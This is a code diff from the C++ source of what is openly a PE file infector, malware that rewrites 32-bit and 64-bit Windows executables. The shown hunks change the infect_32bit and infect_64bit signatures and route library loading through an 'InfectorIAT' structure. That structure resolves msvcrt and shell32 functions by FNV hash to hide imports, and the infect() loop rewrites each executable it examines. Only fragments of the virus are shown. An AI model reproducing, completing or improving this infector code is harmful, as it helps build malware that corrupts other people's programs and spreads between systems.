@@ -132,7 +132,7 @@ LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, std::uint32_t hash)
    return nullptr;
 }
 
-PIMAGE_DOS_HEADER infect_32bit(PIMAGE_DOS_HEADER module)
+PIMAGE_DOS_HEADER infect_32bit(InfectorIAT *iat, PIMAGE_DOS_HEADER module, std::size_t size)
 {
    std::uint8_t *byte_module = reinterpret_cast<std::uint8_t *>(module);
    PIMAGE_NT_HEADERS32 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS32>(byte_module+module->e_lfanew);
@@ -157,7 +157,7 @@ PIMAGE_DOS_HEADER infect_32bit(PIMAGE_DOS_HEADER module)
    return nullptr;
 }
 
-PIMAGE_DOS_HEADER infect_64bit(PIMAGE_DOS_HEADER module)
+PIMAGE_DOS_HEADER infect_64bit(InfectorIAT *iat, PIMAGE_DOS_HEADER module, std::size_t size)
 {
    std::uint8_t *byte_module = reinterpret_cast<std::uint8_t *>(module);
    PIMAGE_NT_HEADERS64 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(byte_module+module->e_lfanew);
@@ -203,7 +203,7 @@ void load_infector_iat(InfectorIAT *iat)
    std::cout << "GetFileSize: " << std::hex << fnv321a("GetFileSize") << std::endl;
    std::cout << "ReadFile: " << std::hex << fnv321a("ReadFile") << std::endl;
    std::cout << "CloseHandle: " << std::hex << fnv321a("CloseHandle") << std::endl;
-   PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary("msvcrt.dll"));
+   PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(iat->loadLibrary("msvcrt.dll"));
    iat->malloc = reinterpret_cast<mallocHeader>(get_proc_by_hash(msvcrtModule, 0x558c274d));
    iat->realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
    iat->free = reinterpret_cast<freeHeader>(get_proc_by_hash(msvcrtModule, 0x99b3eedb));
@@ -211,7 +211,7 @@ void load_infector_iat(InfectorIAT *iat)
    iat->strnicmp = reinterpret_cast<strnicmpHeader>(get_proc_by_hash(msvcrtModule, 0x3b2c5b30));
    iat->strlen = reinterpret_cast<strlenHeader>(get_proc_by_hash(msvcrtModule, 0x58ba3d97));
    iat->memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
-   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary("shell32.dll"));
+   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(iat->loadLibrary("shell32.dll"));
    iat->getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
 }
 
@@ -360,12 +360,12 @@ int infect(void)
       if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
       {
          std::wcout << "\t" << executable << " is 32-bit." << std::endl;
-         rewritten_image = infect_32bit(iat, dos_header, file_size);
+         rewritten_image = infect_32bit(&iat, dos_header, file_size);
       }
       else if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
       {
          std::wcout << "\t" << executable << " is 64-bit." << std::endl;
-         rewritten_image = infect_64bit(iat, dos_header, file_size);
+         rewritten_image = infect_64bit(&iat, dos_header, file_size);
       }
 
       if (rewritten_image != nullptr)
